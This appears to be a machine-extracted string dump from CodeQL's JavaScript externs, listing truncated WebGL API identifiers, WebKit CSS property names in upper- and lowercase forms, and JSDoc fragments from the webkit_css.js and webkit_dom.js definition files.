UE_SIZERENDERB ... UE_SIZEWebGLRe ... A_SIZE;WebGLRe ... HA_SIZERENDERB ... HA_SIZEWebGLRe ... H_SIZE;WebGLRe ... TH_SIZERENDERB ... TH_SIZEWebGLRe ... L_SIZE;WebGLRe ... IL_SIZERENDERB ... IL_SIZEWebGLRe ... T_TYPE;WebGLRe ... CT_TYPEFRAMEBU ... CT_TYPEWebGLRe ... T_NAME;WebGLRe ... CT_NAMEFRAMEBU ... CT_NAMEWebGLRe ... _LEVEL;WebGLRe ... E_LEVELFRAMEBU ... E_LEVELWebGLRe ... P_FACE;WebGLRe ... AP_FACEFRAMEBU ... AP_FACEWebGLRe ... HMENT0;WebGLRe ... CHMENT0WebGLRe ... CHMENT;WebGLRe ... ACHMENTDEPTH_S ... ACHMENTWebGLRe ... t.NONE;WebGLRe ... xt.NONEWebGLRe ... MPLETE;WebGLRe ... OMPLETEFRAMEBU ... ACHMENTWebGLRe ... NSIONS;WebGLRe ... ENSIONSFRAMEBU ... ENSIONSWebGLRe ... PORTED;WebGLRe ... PPORTEDFRAMEBU ... PPORTEDMAX_REN ... ER_SIZEINVALID ... ERATIONWebGLRe ... _WEBGL;WebGLRe ... Y_WEBGLWebGLRe ... A_WEBGLUNPACK_ ... A_WEBGLWebGLRe ... T_WEBGLWebGLRe ... N_WEBGLUNPACK_ ... N_WEBGLBROWSER ... T_WEBGLWebGLRe ... ototypeWebGLRe ... e.LINESWebGLRe ... e.ZERO;WebGLRe ... pe.ZEROWebGLRe ... pe.ONE;WebGLRe ... ype.ONEWebGLRe ... e.FRONTWebGLRe ... e.BACK;WebGLRe ... pe.BACKWebGLRe ... e.BLENDWebGLRe ... ype.CW;WebGLRe ... type.CWWebGLRe ... pe.CCW;WebGLRe ... ype.CCWWebGLRe ... e.BYTE;WebGLRe ... pe.BYTEWebGLRe ... e.SHORTWebGLRe ... pe.INT;WebGLRe ... ype.INTWebGLRe ... e.FLOATWebGLRe ... e.ALPHAWebGLRe ... pe.RGB;WebGLRe ... ype.RGBWebGLRe ... e.RGBA;WebGLRe ... pe.RGBAWebGLRe ... e.NEVERWebGLRe ... e.LESS;WebGLRe ... pe.LESSWebGLRe ... e.EQUALWebGLRe ... e.KEEP;WebGLRe ... pe.KEEPWebGLRe ... e.INCR;WebGLRe ... pe.INCRWebGLRe ... e.DECR;WebGLRe ... pe.DECRWebGLRe ... e.BOOL;WebGLRe ... pe.BOOLWebGLRe ... e.RGBA4WebGLRe ... e.NONE;WebGLRe ... pe.NONEWebGLRe ... canvas;WebGLRe ... .canvasWebGLRe ... rWidth;WebGLRe ... erWidthWebGLRe ... Height;WebGLRe ... rHeightWebGLRe ... n() {};WebGLRe ... on() {}WebGLRe ... ributesWebGLRe ... extLostWebGLRe ... ensionsgetSupp ... ensionsWebGLRe ... me) {};WebGLRe ... ame) {}WebGLRe ... tensionWebGLRe ... re) {};WebGLRe ... ure) {}WebGLRe ... Texturefunction(texture) {}WebGLRe ... er) {};WebGLRe ... der) {}WebGLRe ... hShaderfunctio ... der) {}WebGLRe ... ocationWebGLRe ... fer) {}WebGLRe ... dBufferWebGLRe ... ebufferWebGLRe ... rbufferWebGLRe ... ha) {};WebGLRe ... pha) {}WebGLRe ... ndColorfunctio ... pha) {}WebGLRe ... de) {};WebGLRe ... ode) {}WebGLRe ... quationWebGLRe ... eparateblendEq ... eparateWebGLRe ... or) {};WebGLRe ... tor) {}WebGLRe ... endFuncWebGLRe ... ge) {};WebGLRe ... age) {}WebGLRe ... ferDataWebGLRe ... ta) {};WebGLRe ... ata) {}WebGLRe ... SubDataWebGLRe ... et) {};WebGLRe ... get) {}WebGLRe ... rStatuscheckFr ... rStatusWebGLRe ... sk) {};WebGLRe ... ask) {}WebGLRe ... e.clearWebGLRe ... arColorWebGLRe ... th) {};WebGLRe ... pth) {}WebGLRe ... arDepthfunction(depth) {}WebGLRe ... (s) {};WebGLRe ... n(s) {}WebGLRe ... StencilWebGLRe ... lorMaskWebGLRe ... eShaderfunction(shader) {}WebGLRe ... Image2Dcompres ... Image2DWebGLRe ... ht) {};WebGLRe ... ght) {}WebGLRe ... eBufferWebGLRe ... ProgramWebGLRe ... pe) {};WebGLRe ... ype) {}WebGLRe ... ullFaceWebGLRe ... am) {};WebGLRe ... ram) {}function(program) {}WebGLRe ... nc) {};WebGLRe ... unc) {}WebGLRe ... pthFuncfunction(func) {}WebGLRe ... ag) {};WebGLRe ... lag) {}WebGLRe ... pthMaskWebGLRe ... al) {};WebGLRe ... Val) {}WebGLRe ... thRangefunctio ... Val) {}WebGLRe ... gs) {};WebGLRe ... ags) {}WebGLRe ... disableWebGLRe ... ex) {};WebGLRe ... dex) {}WebGLRe ... ibArraydisable ... ibArrayWebGLRe ... nt) {};WebGLRe ... unt) {}WebGLRe ... wArraysWebGLRe ... set) {}WebGLRe ... lementsWebGLRe ... ap) {};WebGLRe ... cap) {}WebGLRe ... .enablefunction(cap) {}enableV ... ibArrayWebGLRe ... .finishWebGLRe ... e.flushframebu ... rbufferWebGLRe ... el) {};WebGLRe ... vel) {}WebGLRe ... xture2DWebGLRe ... ontFaceWebGLRe ... eMipmapWebGLRe ... eAttribWebGLRe ... UniformWebGLRe ... ShadersWebGLRe ... rameterfunction(pname) {}WebGLRe ... etErrorgetFram ... rameterWebGLRe ... InfoLoggetRend ... rameterWebGLRe ... nFormatgetShad ... nFormatWebGLRe ... rSourceWebGLRe ... on) {};WebGLRe ... ion) {}WebGLRe ... xAttribWebGLRe ... bOffsetgetVert ... bOffsetWebGLRe ... pe.hintWebGLRe ... sBufferWebGLRe ... EnabledWebGLRe ... sShaderWebGLRe ... dth) {}WebGLRe ... neWidthfunction(width) {}WebGLRe ... lStoreiWebGLRe ... ts) {};WebGLRe ... its) {}WebGLRe ... nOffsetWebGLRe ... ls) {};WebGLRe ... els) {}WebGLRe ... dPixelsfunctio ... els) {}WebGLRe ... StorageWebGLRe ... rt) {};WebGLRe ... ert) {}WebGLRe ... overageWebGLRe ... scissorWebGLRe ... ce) {};WebGLRe ... rce) {}WebGLRe ... cilFuncfunctio ... ask) {}WebGLRe ... cilMaskWebGLRe ... ss) {};WebGLRe ... ass) {}WebGLRe ... encilOpfunctio ... ass) {}WebGLRe ... ameterfWebGLRe ... ameteriWebGLRe ... ue) {};WebGLRe ... lue) {}WebGLRe ... iform1fWebGLRe ... form1fvWebGLRe ... iform1iWebGLRe ... form1ivWebGLRe ... e2) {};WebGLRe ... ue2) {}WebGLRe ... iform2fWebGLRe ... form2fvWebGLRe ... iform2iWebGLRe ... form2ivWebGLRe ... e3) {};WebGLRe ... ue3) {}WebGLRe ... iform3ffunctio ... ue3) {}WebGLRe ... form3fvWebGLRe ... iform3iWebGLRe ... form3ivWebGLRe ... e4) {};WebGLRe ... ue4) {}WebGLRe ... iform4ffunctio ... ue4) {}WebGLRe ... form4fvWebGLRe ... iform4iWebGLRe ... form4ivWebGLRe ... trix2fvWebGLRe ... trix3fvWebGLRe ... trix4fvWebGLRe ...  x) {};WebGLRe ... , x) {}WebGLRe ... ttrib1ffunction(indx, x) {}WebGLRe ... es) {};WebGLRe ... ues) {}WebGLRe ... trib1fvfunctio ... ues) {}WebGLRe ...  y) {};WebGLRe ... , y) {}WebGLRe ... ttrib2fWebGLRe ... trib2fvWebGLRe ...  z) {};WebGLRe ... , z) {}WebGLRe ... ttrib3ffunctio ... , z) {}WebGLRe ... trib3fvWebGLRe ...  w) {};WebGLRe ... , w) {}WebGLRe ... ttrib4ffunctio ... , w) {}WebGLRe ... trib4fvWebGLRe ... PointerWebGLRe ... iewportWebGLCo ... ributesWebGLCo ... .alpha;WebGLCo ... e.alphaWebGLCo ... ototypeWebGLCo ... .depth;WebGLCo ... e.depthWebGLCo ... tencil;WebGLCo ... stencilWebGLCo ... ialias;WebGLCo ... tialiasWebGLCo ... dAlpha;WebGLCo ... edAlphaWebGLCo ... Buffer;WebGLCo ... gBufferpreserv ... gBufferWebGLCo ... rmance;WebGLCo ... ormancepreferL ... ormanceWebGLCo ... Caveat;WebGLCo ... eCaveatfailIfM ... eCaveatWebGLCo ... essage;WebGLCo ... Messagefunctio ... at() {}WebGLSh ... nFormatWebGLSh ... ngeMin;WebGLSh ... angeMinWebGLSh ... ototypeWebGLSh ... ngeMax;WebGLSh ... angeMaxWebGLSh ... cision;WebGLSh ... ecisionWebGLAc ... e.size;WebGLAc ... pe.sizeWebGLAc ... ototypeWebGLAc ... e.type;WebGLAc ... pe.typeWebGLAc ... e.name;WebGLAc ... pe.nameOES_tex ... f_floatOES_tex ... AT_OES;OES_tex ... OAT_OESOES_tex ... ototypeWEBGL_l ... n() {};WEBGL_l ... on() {}WEBGL_l ... ContextWEBGL_l ... ototypeOES_sta ... vativesOES_sta ... NT_OES;OES_sta ... INT_OESOES_sta ... ototypeFRAGMEN ... INT_OESfunctio ... ES() {}WebGLVe ... jectOESOES_ver ... _objectOES_ver ... NG_OES;OES_ver ... ING_OESOES_ver ... ototypeVERTEX_ ... ING_OESOES_ver ... n() {};OES_ver ... on() {}OES_ver ... rrayOESOES_ver ... ct) {};OES_ver ... ect) {}WEBGL_d ... er_infoWEBGL_d ... _WEBGL;WEBGL_d ... R_WEBGLWEBGL_d ... ototypeUNMASKE ... R_WEBGLWEBGL_d ... er) {};WEBGL_d ... der) {}WEBGL_d ... rSourcegetTran ... rSourcefunctio ... tc() {}WEBGL_c ... re_s3tcWEBGL_c ... T1_EXT;WEBGL_c ... XT1_EXTWEBGL_c ... ototypeCOMPRES ... XT1_EXTWEBGL_c ... T3_EXT;WEBGL_c ... XT3_EXTCOMPRES ... XT3_EXTWEBGL_c ... T5_EXT;WEBGL_c ... XT5_EXTCOMPRES ... XT5_EXTOES_ele ... ex_uintfunctio ... ic() {}EXT_tex ... otropicEXT_tex ... PY_EXT;EXT_tex ... OPY_EXTEXT_tex ... ototypeTEXTURE ... OPY_EXTMAX_TEX ... OPY_EXTWEBGL_d ... 0_WEBGLCOLOR_A ... 0_WEBGLWEBGL_d ... 1_WEBGLCOLOR_A ... 1_WEBGLWEBGL_d ... 2_WEBGLCOLOR_A ... 2_WEBGLWEBGL_d ... 3_WEBGLCOLOR_A ... 3_WEBGLWEBGL_d ... 4_WEBGLCOLOR_A ... 4_WEBGLWEBGL_d ... 5_WEBGLCOLOR_A ... 5_WEBGLWEBGL_d ... 6_WEBGLCOLOR_A ... 6_WEBGLWEBGL_d ... 7_WEBGLCOLOR_A ... 7_WEBGLWEBGL_d ... 8_WEBGLCOLOR_A ... 8_WEBGLWEBGL_d ... 9_WEBGLCOLOR_A ... 9_WEBGLWEBGL_d ... S_WEBGLMAX_COL ... S_WEBGLMAX_DRA ... S_WEBGLWEBGL_d ... rs) {};WEBGL_d ... ers) {}WEBGL_d ... rsWEBGLfunction(buffers) {}functio ... ys() {}ANGLE_i ... _arraysANGLE_i ... _ANGLE;ANGLE_i ... R_ANGLEANGLE_i ... ototypeVERTEX_ ... R_ANGLEANGLE_i ... nt) {};ANGLE_i ... unt) {}ANGLE_i ... edANGLEdrawArr ... edANGLEdrawEle ... edANGLEANGLE_i ... or) {};ANGLE_i ... sor) {}ANGLE_i ... orANGLEvertexA ... orANGLEH:/codeql/javascript/tools/data/externs/web/webkit_css.js
 * @fileoverview Definitions for WebKit's custom CSS properties. Copied from:
 * {@link
 * http://trac.webkit.org/browser/trunk/Source/WebCore/css/CSSPropertyNames.in}
 *
 * If you make changes to this file, notice that every property appears
 * twice: once as an uppercase name and once as a lowercase name.
 * WebKit allows both. The uppercase version is preferred.
 *
 * @externs
 * @author nicksantos@google.com (Nick Santos)
  WebKit also adds bindings for the lowercase versions of these properties.// WebK ... erties. The uppercase version is preferred.// The  ... ferred.
 * @constructor
 * @param {number} x
 * @param {number} y
 /**\n *  ... } y\n */WebkitAlignContentWebkitAlignItemsWebkitAlignSelfWebkitAnimationWebkitAnimationDelayWebkitAnimationDirectionWebkitAnimationDurationWebkitAnimationFillModeWebkitAnimationIterationCountWebkitAnimationNameWebkitAnimationPlayStateWebkitAnimationTimingFunctionWebkitAppearanceWebkitAppRegionWebkitAspectRatioWebkitBackfaceVisibilityWebkitBackgroundClipWebkitBackgroundCompositeWebkitBackgroundOriginWebkitBackgroundSizeWebkitBindingWebkitBlendModeWebkitBorderAfterWebkitBorderAfterColorWebkitBorderAfterStyleWebkitBorderAfterWidthWebkitBorderBeforeWebkitBorderBeforeColorWebkitBorderBeforeStyleWebkitBorderBeforeWidthWebkitBorderBottomLeftRadiusWebkitBorderBottomRightRadiusWebkitBorderEndWebkitBorderEndColorWebkitBorderEndStyleWebkitBorderEndWidthWebkitBorderFitWebkitBorderHorizontalSpacingWebkitBorderImageWebkitBorderRadiusWebkitBorderStartWebkitBorderStartColorWebkitBorderStartStyleWebkitBorderStartWidthWebkitBorderTopLeftRadiusWebkitBorderTopRightRadiusWebkitBorderVerticalSpacingWebkitBoxAlignWebkitBoxDecorationBreakWebkitBoxDirectionWebkitBoxFlexWebkitBoxFlexGroupWebkitBoxLinesWebkitBoxOrdinalGroupWebkitBoxOrientWebkitBoxPackWebkitBoxReflectWebkitBoxShadowWebkitBoxSizingWebkitColorCorrectionWebkitColumnAxisWebkitColumnBreakAfterWebkitColumnBreakBeforeWebkitColumnBreakInsideWebkitColumnCountWebkitColumnGapWebkitColumnProgressionWebkitColumnRuleWebkitColumnRuleColorWebkitColumnRuleStyleWebkitColumnRuleWidthWebkitColumnsWebkitColumnSpanWebkitColumnWidthWebkitDashboardRegionWebkitFilterWebkitFlexWebkitFlexBasisWebkitFlexDirectionWebkitFlexFlowWebkitFlexGrowWebkitFlexShrinkWebkitFlexWrapWebkitFlowFromWebkitFlowIntoWebkitFontSizeDeltaWebkitFontSmoothingWebkitGridColumnWebkitGridColumnsWebkitGridRowWebkitGridRowsWebkitHighlightWebkitHyphenateCharacterWebkitHyphenateLimitAfterWebkitHyphenateLimitBeforeWebkitHyphenateLimitLinesWebkitHyphensWebkitJustifyContentWebkitLineAlignWebkitLineBoxContainWebkitLineBreakWebkitLineClampWebkitLineGridWebkitLineSnapWebkitLocaleWebkitLogicalHeightWebkitLogicalWidthWebkitMarginAfterWebkitMarginAfterCollapseWebkitMarginBeforeWebkitMarginBeforeCollapseWebkitMarginBottomCollapseWebkitMarginCollapseWebkitMarginEndWebkitMarginStartWebkitMarginTopCollapseWebkitMarqueeWebkitMarqueeDirectionWebkitMarqueeIncrementWebkitMarqueeRepetitionWebkitMarqueeSpeedWebkitMarqueeStyleWebkitMaskWebkitMaskAttachmentWebkitMaskBoxImageWebkitMaskBoxImageOutsetWebkitMaskBoxImageRepeatWebkitMaskBoxImageSliceWebkitMaskBoxImageSourceWebkitMaskBoxImageWidthWebkitMaskClipWebkitMaskCompositeWebkitMaskImageWebkitMaskOriginWebkitMaskPositionWebkitMaskPositionXWebkitMaskPositionYWebkitMaskRepeatWebkitMaskRepeatXWebkitMaskRepeatYWebkitMaskSizeWebkitMatchNearestMailBlockquoteColorWebkitMaxLogicalHeightWebkitMaxLogicalWidthWebkitMinLogicalHeightWebkitMinLogicalWidthWebkitNbspModeWebkitOrderWebkitOverflowScrollingWebkitPaddingAfterWebkitPaddingBeforeWebkitPaddingEndWebkitPaddingStartWebkitPerspectiveWebkitPerspectiveOriginWebkitPerspectiveOriginXWebkitPerspectiveOriginYWebkitPrintColorAdjustWebkitRegionBreakAfterWebkitRegionBreakBeforeWebkitRegionBreakInsideWebkitRegionOverflowWebkitRtlOrderingWebkitRubyPositionWebkitShapeInsideWebkitShapeMarginWebkitShapeOutsideWebkitShapePaddingWebkitTapHighlightColorWebkitTextAlignLastWebkitTextCombineWebkitTextDecorationLineWebkitTextDecorationsInEffectWebkitTextDecorationStyleWebkitTextEmphasisWebkitTextEmphasisColorWebkitTextEmphasisPositionWebkitTextEmphasisStyleWebkitTextFillColorWebkitTextOrientationWebkitTextSecurityWebkitTextSizeAdjustWebkitTextStrokeWebkitTextStrokeColorWebkitTextStrokeWidthWebkitTransformWebkitTransformOriginWebkitTransformOriginXWebkitTransformOriginYWebkitTransformOriginZWebkitTransformStyleWebkitTransitionWebkitTransitionDelayWebkitTransitionDurationWebkitTransitionPropertyWebkitTransitionRepeatCountWebkitTransitionTimingFunctionWebkitUserDragWebkitUserModifyWebkitUserSelectWebkitWrapWebkitWrapFlowWebkitWrapThroughWebkitWritingModewebkitAlignContentwebkitAlignItemswebkitAlignSelfwebkitAnimationwebkitAnimationDelaywebkitAnimationDirectionwebkitAnimationDurationwebkitAnimationFillModewebkitAnimationIterationCountwebkitAnimationNamewebkitAnimationPlayStatewebkitAnimationTimingFunctionwebkitAppearancewebkitAppRegionwebkitAspectRatiowebkitBackfaceVisibilitywebkitBackgroundClipwebkitBackgroundCompositewebkitBackgroundOriginwebkitBackgroundSizewebkitBindingwebkitBlendModewebkitBorderAfterwebkitBorderAfterColorwebkitBorderAfterStylewebkitBorderAfterWidthwebkitBorderBeforewebkitBorderBeforeColorwebkitBorderBeforeStylewebkitBorderBeforeWidthwebkitBorderBottomLeftRadiuswebkitBorderBottomRightRadiuswebkitBorderEndwebkitBorderEndColorwebkitBorderEndStylewebkitBorderEndWidthwebkitBorderFitwebkitBorderHorizontalSpacingwebkitBorderImagewebkitBorderRadiuswebkitBorderStartwebkitBorderStartColorwebkitBorderStartStylewebkitBorderStartWidthwebkitBorderTopLeftRadiuswebkitBorderTopRightRadiuswebkitBorderVerticalSpacingwebkitBoxAlignwebkitBoxDecorationBreakwebkitBoxDirectionwebkitBoxFlexwebkitBoxFlexGroupwebkitBoxLineswebkitBoxOrdinalGroupwebkitBoxOrientwebkitBoxPackwebkitBoxReflectwebkitBoxShadowwebkitBoxSizingwebkitColorCorrectionwebkitColumnAxiswebkitColumnBreakAfterwebkitColumnBreakBeforewebkitColumnBreakInsidewebkitColumnCountwebkitColumnGapwebkitColumnProgressionwebkitColumnRulewebkitColumnRuleColorwebkitColumnRuleStylewebkitColumnRuleWidthwebkitColumnswebkitColumnSpanwebkitColumnWidthwebkitDashboardRegionwebkitFilterwebkitFlexwebkitFlexBasiswebkitFlexDirectionwebkitFlexFlowwebkitFlexGrowwebkitFlexShrinkwebkitFlexWrapwebkitFlowFromwebkitFlowIntowebkitFontSizeDeltawebkitFontSmoothingwebkitGridColumnwebkitGridColumnswebkitGridRowwebkitGridRowswebkitHighlightwebkitHyphenateCharacterwebkitHyphenateLimitAfterwebkitHyphenateLimitBeforewebkitHyphenateLimitLineswebkitHyphenswebkitJustifyContentwebkitLineAlignwebkitLineBoxContainwebkitLineBreakwebkitLineClampwebkitLineGridwebkitLineSnapwebkitLocalewebkitLogicalHeightwebkitLogicalWidthwebkitMarginAfterwebkitMarginAfterCollapsewebkitMarginBeforewebkitMarginBeforeCollapsewebkitMarginBottomCollapsewebkitMarginCollapsewebkitMarginEndwebkitMarginStartwebkitMarginTopCollapsewebkitMarqueewebkitMarqueeDirectionwebkitMarqueeIncrementwebkitMarqueeRepetitionwebkitMarqueeSpeedwebkitMarqueeStylewebkitMaskwebkitMaskAttachmentwebkitMaskBoxImagewebkitMaskBoxImageOutsetwebkitMaskBoxImageRepeatwebkitMaskBoxImageSlicewebkitMaskBoxImageSourcewebkitMaskBoxImageWidthwebkitMaskClipwebkitMaskCompositewebkitMaskImagewebkitMaskOriginwebkitMaskPositionwebkitMaskPositionXwebkitMaskPositionYwebkitMaskRepeatwebkitMaskRepeatXwebkitMaskRepeatYwebkitMaskSizewebkitMatchNearestMailBlockquoteColorwebkitMaxLogicalHeightwebkitMaxLogicalWidthwebkitMinLogicalHeightwebkitMinLogicalWidthwebkitNbspModewebkitOrderwebkitOverflowScrollingwebkitPaddingAfterwebkitPaddingBeforewebkitPaddingEndwebkitPaddingStartwebkitPerspectivewebkitPerspectiveOriginwebkitPerspectiveOriginXwebkitPerspectiveOriginYwebkitPrintColorAdjustwebkitRegionBreakAfterwebkitRegionBreakBeforewebkitRegionBreakInsidewebkitRegionOverflowwebkitRtlOrderingwebkitRubyPositionwebkitShapeInsidewebkitShapeMarginwebkitShapeOutsidewebkitShapePaddingwebkitTapHighlightColorwebkitTextAlignLastwebkitTextCombinewebkitTextDecorationLinewebkitTextDecorationsInEffectwebkitTextDecorationStylewebkitTextEmphasiswebkitTextEmphasisColorwebkitTextEmphasisPositionwebkitTextEmphasisStylewebkitTextFillColorwebkitTextOrientationwebkitTextSecuritywebkitTextSizeAdjustwebkitTextStrokewebkitTextStrokeColorwebkitTextStrokeWidthwebkitTransformwebkitTransformOriginwebkitTransformOriginXwebkitTransformOriginYwebkitTransformOriginZwebkitTransformStylewebkitTransitionwebkitTransitionDelaywebkitTransitionDurationwebkitTransitionPropertywebkitTransitionRepeatCountwebkitTransitionTimingFunctionwebkitUserDragwebkitUserModifywebkitUserSelectwebkitWrapwebkitWrapFlowwebkitWrapThroughwebkitWritingModeWebKitPointDefinitions for WebKit's custom CSS properties. Copied from:
{@link
http://trac.webkit.org/browser/trunk/Source/WebCore/css/CSSPropertyNames.in}
* If you make changes to this file, notice that every property appears
twice: once as an uppercase name and once as a lowercase name.
WebKit allows both. The uppercase version is preferred.
*CSSProp ... mation;CSSProp ... imationWebkitA ... rectionWebkitA ... urationCSSProp ... llMode;CSSProp ... illModeWebkitA ... illModeCSSProp ... onCountWebkitA ... onCountCSSProp ... onName;CSSProp ... ionNameCSSProp ... yState;CSSProp ... ayStateWebkitA ... ayStateWebkitA ... unctionCSSProp ... pRegionCSSProp ... tRatio;CSSProp ... ctRatioWebkitB ... ibilityCSSProp ... posite;CSSProp ... mpositeWebkitB ... mpositeWebkitB ... dOriginCSSProp ... ndMode;CSSProp ... endModeCSSProp ... rAfter;CSSProp ... erAfterWebkitB ... erColorWebkitB ... erStyleWebkitB ... erWidthCSSProp ... rBeforeCSSProp ... reColorWebkitB ... reColorCSSProp ... reStyleWebkitB ... reStyleCSSProp ... reWidthWebkitB ... reWidthWebkitB ... tRadiusCSSProp ... derFit;CSSProp ... rderFitWebkitB ... SpacingWebkitB ... rtColorWebkitB ... rtStyleWebkitB ... rtWidthCSSProp ... nBreak;CSSProp ... onBreakWebkitB ... onBreakCSSProp ... xGroup;CSSProp ... exGroupCSSProp ... xLines;CSSProp ... oxLinesWebkitB ... alGroupCSSProp ... eflect;CSSProp ... ReflectWebkitC ... rectionCSSProp ... mnAxis;CSSProp ... umnAxisWebkitC ... akAfterWebkitC ... kBeforeWebkitC ... kInsideWebkitC ... ressionWebkitC ... leColorWebkitC ... leStyleWebkitC ... leWidthCSSProp ... olumns;CSSProp ... ColumnsCSSProp ... mnSpan;CSSProp ... umnSpanCSSProp ... dRegionWebkitD ... dRegionCSSProp ... tFilterCSSProp ... itFlex;CSSProp ... kitFlexCSSProp ... owFrom;CSSProp ... lowFromCSSProp ... owInto;CSSProp ... lowIntoCSSProp ... eDelta;CSSProp ... zeDeltaCSSProp ... othing;CSSProp ... oothingCSSProp ... Column;CSSProp ... dColumnCSSProp ... ridRow;CSSProp ... GridRowCSSProp ... idRows;CSSProp ... ridRowsCSSProp ... hlight;CSSProp ... ghlightCSSProp ... racter;CSSProp ... aracterWebkitH ... aracterCSSProp ... tAfter;CSSProp ... itAfterWebkitH ... itAfterCSSProp ... tBeforeWebkitH ... tBeforeCSSProp ... tLines;CSSProp ... itLinesWebkitH ... itLinesCSSProp ... yphens;CSSProp ... HyphensCSSProp ... eAlign;CSSProp ... neAlignCSSProp ... ontain;CSSProp ... ContainCSSProp ... eClamp;CSSProp ... neClampCSSProp ... neGrid;CSSProp ... ineGridCSSProp ... neSnap;CSSProp ... ineSnapCSSProp ... Locale;CSSProp ... tLocaleCSSProp ... alWidthCSSProp ... nAfter;CSSProp ... inAfterWebkitM ... ollapseCSSProp ... nBeforeCSSProp ... arquee;CSSProp ... MarqueeWebkitM ... rectionWebkitM ... crementCSSProp ... tition;CSSProp ... etitionWebkitM ... etitionCSSProp ... eSpeed;CSSProp ... eeSpeedCSSProp ... eeStyleCSSProp ... itMask;CSSProp ... kitMaskCSSProp ... xImage;CSSProp ... oxImageWebkitM ... eOutsetWebkitM ... eRepeatWebkitM ... geSliceWebkitM ... eSourceWebkitM ... geWidthCSSProp ... skClip;CSSProp ... askClipCSSProp ... kImage;CSSProp ... skImageCSSProp ... kOriginCSSProp ... kRepeatCSSProp ... epeatX;CSSProp ... RepeatXCSSProp ... epeatY;CSSProp ... RepeatYCSSProp ... skSize;CSSProp ... askSizeCSSProp ... teColorWebkitM ... teColorWebkitM ... lHeightWebkitM ... alWidthCSSProp ... spMode;CSSProp ... bspModeCSSProp ... tOrder;CSSProp ... itOrderCSSProp ... olling;CSSProp ... rollingWebkitO ... rollingCSSProp ... gAfter;CSSProp ... ngAfterCSSProp ... gBeforeWebkitP ... eOriginCSSProp ... riginX;CSSProp ... OriginXWebkitP ... OriginXCSSProp ... riginY;CSSProp ... OriginYWebkitP ... OriginYCSSProp ... rAdjustWebkitP ... rAdjustWebkitR ... akAfterWebkitR ... kBeforeWebkitR ... kInsideCSSProp ... dering;CSSProp ... rderingCSSProp ... eInsideCSSProp ... Margin;CSSProp ... eMarginCSSProp ... utside;CSSProp ... OutsideCSSProp ... PaddingWebkitT ... htColorCSSProp ... ombine;CSSProp ... CombineCSSProp ... onLine;CSSProp ... ionLineWebkitT ... ionLineCSSProp ... Effect;CSSProp ... nEffectWebkitT ... nEffectCSSProp ... nStyle;CSSProp ... onStyleWebkitT ... onStyleCSSProp ... phasis;CSSProp ... mphasisCSSProp ... sColor;CSSProp ... isColorWebkitT ... isColorWebkitT ... ositionCSSProp ... sStyle;CSSProp ... isStyleWebkitT ... isStyleCSSProp ... lColor;CSSProp ... llColorCSSProp ... tation;CSSProp ... ntationWebkitT ... ntationCSSProp ... curity;CSSProp ... ecurityCSSProp ... Stroke;CSSProp ... tStrokeCSSProp ... keColorWebkitT ... keColorCSSProp ... keWidthWebkitT ... keWidthWebkitT ... mOriginWebkitT ... OriginXWebkitT ... OriginYCSSProp ... riginZ;CSSProp ... OriginZWebkitT ... OriginZWebkitT ... onDelayWebkitT ... urationWebkitT ... ropertyCSSProp ... tCount;CSSProp ... atCountWebkitT ... atCountWebkitT ... unctionCSSProp ... erDrag;CSSProp ... serDragCSSProp ... itWrap;CSSProp ... kitWrapCSSProp ... apFlow;CSSProp ... rapFlowCSSProp ... hrough;CSSProp ... ThroughwebkitA ... rectionwebkitA ... urationwebkitA ... illModewebkitA ... onCountwebkitA ... ayStatewebkitA ... unctionwebkitB ... ibilitywebkitB ... mpositewebkitB ... dOriginwebkitB ... erColorwebkitB ... erStylewebkitB ... erWidthwebkitB ... reColorwebkitB ... reStylewebkitB ... reWidthwebkitB ... tRadiuswebkitB ... SpacingwebkitB ... rtColorwebkitB ... rtStylewebkitB ... rtWidthwebkitB ... onBreakwebkitB ... alGroupwebkitC ... rectionwebkitC ... akAfterwebkitC ... kBeforewebkitC ... kInsidewebkitC ... ressionwebkitC ... leColorwebkitC ... leStylewebkitC ... leWidthwebkitD ... dRegionwebkitH ... aracterwebkitH ... itAfterwebkitH ... tBeforewebkitH ... itLineswebkitM ... ollapsewebkitM ... rectionwebkitM ... crementwebkitM ... etitionwebkitM ... eOutsetwebkitM ... eRepeatwebkitM ... geSlicewebkitM ... eSourcewebkitM ... geWidthwebkitM ... teColorwebkitM ... lHeightwebkitM ... alWidthwebkitO ... rollingwebkitP ... eOriginwebkitP ... OriginXwebkitP ... OriginYwebkitP ... rAdjustwebkitR ... akAfterwebkitR ... kBeforewebkitR ... kInsidewebkitT ... htColorwebkitT ... ionLinewebkitT ... nEffectwebkitT ... onStylewebkitT ... isColorwebkitT ... ositionwebkitT ... isStylewebkitT ... ntationwebkitT ... keColorwebkitT ... keWidthwebkitT ... mOriginwebkitT ... OriginXwebkitT ... OriginYwebkitT ... OriginZwebkitT ... onDelaywebkitT ... urationwebkitT ... ropertywebkitT ... atCountwebkitT ... unctionWebKitP ... type.x;WebKitP ... otype.xWebKitP ... ototypeWebKitP ... type.y;WebKitP ... otype.yH:/codeql/javascript/tools/data/externs/web/webkit_dom.js
 * @fileoverview Definitions for all the extensions over W3C's DOM
 *  specification by WebKit. This file depends on w3c_dom2.js.
 *  All the provided definitions has been type annotated
 *
 * @externs
 
 * @param {boolean=} opt_center
 * @see https://bugzilla.mozilla.org/show_bug.cgi?id=403510
 * @return {undefined}
 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.idl
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.cpp
 /**\n *  ... cpp\n */
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfileNode.idl
  @type {Array<ScriptProfileNode>} 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfile.idl
  @type {ScriptProfileNode} 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.idl
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.cpp
 
 * @param {*} condition
 * @param {...*} var_args
 * @return {undefined}
 
 * @param {...*} var_args
 * @return {undefined}
 
 * @param {*} value
 * @return {undefined}
 
 * @param {!Object} data
 * @param {*=} opt_columns
 * @return {undefined}
 
 * @param {string=} opt_title
 * @return {undefined}
  @type {Array<ScriptProfile>} /** @ty ... le>} */ @type {MemoryInfo} /** @ty ... nfo} */
 * @type {!Console}
 * @suppress {duplicate}
 
 * @type {number}
 * @see http://developer.android.com/reference/android/webkit/WebView.html
 
 * @param {Node} baseNode
 * @param {number} baseOffset
 * @param {Node} extentNode
 * @param {number} extentOffset
 * @return {undefined}
 
 * @param {string} alter
 * @param {string} direction
 * @param {string} granularity
